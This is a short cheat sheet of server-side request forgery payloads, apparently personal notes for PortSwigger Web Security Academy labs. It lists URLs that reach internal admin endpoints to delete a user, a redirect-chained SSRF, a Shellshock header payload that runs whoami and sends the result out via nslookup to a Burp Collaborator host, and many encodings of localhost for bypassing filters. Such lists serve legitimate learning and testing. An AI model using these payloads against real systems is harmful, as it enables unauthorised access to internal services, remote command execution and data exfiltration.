['https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](URL validation bypass cheat sheet)

```
port: 6566, 8080

http://localhost/admin/delete?username=carlos

http://192.168.0.1:8080/admin

http://127.1/admin
http://127.0.0.1/

/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

shellshock: Referer header, User-Agent header 
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN

http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

out-of-band-detection: Referer header
```

```
127.0.0.1
127.1
```  

```
localhost
Localhost
LocalHost
lOcAlhOsT
LOcalHOSt
```  

```
[::]
[0000::1]
[0:0:0:0:0:ffff:127.0.0.1]
```

```
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821
```

```
2130706433
3232235521
3232235777
2130706433
```  

```
017700000001
```  